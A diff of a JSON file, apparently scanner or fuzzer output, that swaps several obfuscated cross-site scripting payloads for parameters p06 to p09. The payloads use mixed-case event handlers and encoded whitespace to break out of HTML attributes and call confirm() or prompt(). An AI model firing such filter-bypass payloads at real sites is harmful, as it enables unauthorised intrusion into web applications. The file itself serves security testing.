@@ -48,16 +48,16 @@
   {
     "payloads": [
       {
-        "payload": "\"><A%0dONPoINTeRENteR%0a=%0aconfirm()%0dx>v3dm0s"
+        "payload": "\"><D3V%09oNpOintERENter+=+(prompt)``>v3dm0s"
       },
       {
-        "payload": "\"><a/+/oNMouSeOVEr%09=%09a=prompt,a()%0dx>v3dm0s"
+        "payload": "\"><A/+/ONmOUsEOver%09=%09confirm()>v3dm0s"
       },
       {
-        "payload": "\"><HTml%0dOnmoUsEOvEr+=+[8].find(confirm)%0dx//"
+        "payload": "\"><D3V%09ONMoUseoVer+=+a=prompt,a()%0dx>v3dm0s"
       },
       {
-        "payload": "\"><HTML%0aONMOusEOVEr%09=%09(prompt)``%0dx//"
+        "payload": "\"><D3v%09ONMOuseoVer+=+(confirm)()>v3dm0s"
       }
     ],
     "parameter": "p06"
@@ -65,16 +65,16 @@
   {
     "payloads": [
       {
-        "payload": "'><DETails%0aONpOinTerenter%0a=%0aconfirm()>"
+        "payload": "'><HTml%0aoNpoinTeRENter%0a=%0aa=prompt,a()%0dx>"
       },
       {
-        "payload": "'><A%0aoNMOusEOVER%09=%09confirm()%0dx>v3dm0s"
+        "payload": "'><D3V%0dONPoINTerENtEr%0a=%0a(confirm)()%0dx>v3dm0s"
       },
       {
-        "payload": "'><HTML%0dONMOusEOver%09=%09a=prompt,a()%0dx//"
+        "payload": "'><D3V%0aoNmOuSeOvEr%0a=%0aa=prompt,a()%0dx>v3dm0s"
       },
       {
-        "payload": "'><dEtaILS%0aOnpOINteReNTer%0d=%0dconfirm()%0dx>"
+        "payload": "'><DETAIls%0aonTOGgLE+=+[8].find(confirm)%0dx//"
       }
     ],
     "parameter": "p07"
@@ -82,16 +82,16 @@
   {
     "payloads": [
       {
-        "payload": "\"/+/AuTofOCUS/+/OnfOcUs=\"a=prompt,a()"
+        "payload": "\"%09aUtoFocus%09OnFOcuS=\"confirm()"
       },
       {
-        "payload": "\"/+/AutofoCus/+/OnFOcus=\"[8].find(confirm)"
+        "payload": "\"%09aUtOFoCUS%09onFOcUS=\"(confirm)()"
       },
       {
-        "payload": "\"%09AUToFoCus%09oNFocUS=\"[8].find(confirm)"
+        "payload": "\"%09aUTofoCUS%09OnfOcUS=\"(prompt)``"
       },
       {
-        "payload": "\"/+/autOFocUS/+/ONfocUs=\"confirm()"
+        "payload": "\"%09AUTOFOCus%09onFOCUS=\"a=prompt,a()"
       }
     ],
     "parameter": "p08"
@@ -99,16 +99,16 @@
   {
     "payloads": [
       {
-        "payload": "'%0dAuTofOcUs%0doNFOcuS='a=prompt,a()"
+        "payload": "'%0daUTOfOcus%0dONfocus='confirm()"
       },
       {
-        "payload": "'%09auTOfoCus%09onfOcUs='a=prompt,a()"
+        "payload": "'%09aUtofocuS%09OnfOcUs='confirm()"
       },
       {
-        "payload": "'%0aaUtoFoCus%0aoNFOCUs='[8].find(confirm)"
+        "payload": "'/+/AUtOFoCUS/+/ONfocuS='a=prompt,a()"
       },
       {
-        "payload": "'%0aauToFoCuS%0aoNfocUS='confirm()"
+        "payload": "'%0daUtOfOcuS%0dONfoCUs='a=prompt,a()"
       }
     ],
     "parameter": "p09"
